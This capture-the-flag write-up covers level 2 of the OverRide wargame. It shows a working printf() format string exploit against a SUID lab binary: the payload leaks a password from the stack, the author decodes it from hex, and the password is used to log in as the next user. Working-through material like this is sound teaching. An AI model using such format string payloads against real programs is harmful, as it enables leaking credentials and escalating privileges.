# Level 2

## Vulnerability

printf() format string attack, read password on stack

## Context

We find a binary with owner ```level03``` and SUID.
```
level02@OverRide:~$ ls -l
-rwsr-s---+ 1 level03 users 9452 Sep 10  2016 level02
```

When run it prompts user to log in with username and password. It exits if given incorrect password.
```
level02@OverRide:~$ ./level02
===== [ Secure Access System v1.0 ] =====
/***************************************\
| You must login to access this system. |
\**************************************/
--[ Username: me!
--[ Password: mine!
*****************************************
me! does not have access!
```

## Solution

### main() overview

Investigating with gdb we find no other functions apart from ```main()```. See [disassembly notes](https://github.com/anyashuka/Override/blob/main/level02/Ressources/disassembly_notes.md) for detailed gdb assembly breakdown.

First ```main()``` reads the correct password for user ```level03```, from the ```/home/users/level03/.pass``` file, into a variable on the stack.

Then ```main()``` prompts user for username and password, reading from stdin.

Finally ```strncmp()``` compares the password input by user with the correct password. If the password is correct ```system("/bin/sh")``` opens a shell.

### Exploit

The key vulnerability is the username provided is then printed with ```printf()```. So we can use the format string attack to print what is on the stack, where the password is stored.

With the format string attack, looking through arguments in the stack we find what looks like a password at arguments 22-26.
```
level02@OverRide:~$ (python -c 'print("%26$p%25$p%24$p%23$p%22$p")'; python -c 'print("pass")'; cat) | ~/level02
===== [ Secure Access System v1.0 ] =====
/***************************************\
| You must login to access this system. |
\**************************************/
--[ Username: --[ Password: *****************************************
0x48336750664b394d0x354a35686e4758730x377a7143574e67580x45414a35617339510x756e505234376848 does not have access!
```

Converted to ASCII, and reversed to revert endian, we find our password.
```
level02@OverRide:~$ echo 0x48336750664b394d0x354a35686e4758730x377a7143574e67580x45414a35617339510x756e505234376848 | xxd -r -p | rev
Hh74RPnuQ9sa5JAEXgNWCqz7sXGnh5J5M9KfPg3H
```

Let's log in to confirm this is the correct password.
```
level02@OverRide:~$ su level03
Password: Hh74RPnuQ9sa5JAEXgNWCqz7sXGnh5J5M9KfPg3H
...
level03@OverRide:~$
```

## Recreate Exploited Binary

As user ```level03```, in ```/tmp```, create and compile ```level02_source.c```
```
level03@OverRide:/tmp$ gcc level02_source.c -o level02_source
```

Edit permissions including suid, then move the binary to home directory.
```
level03@OverRide:/tmp$ chmod u+s level02_source; chmod +wx ~; mv level02_source ~
```

Exit back to user ```level02```, then launch the source with the format string exploit. This time we find the password at arguments 38-42
```
level02@OverRide:~$ (python -c 'print("%42$p%41$p%40$p%39$p%38$p")'; python -c 'print("pass")'; cat) | /home/users/level03/level02_source
...
0x48336750664b394d0x354a35686e4758730x377a7143574e67580x45414a35617339510x756e505234376848 does not have access!
```
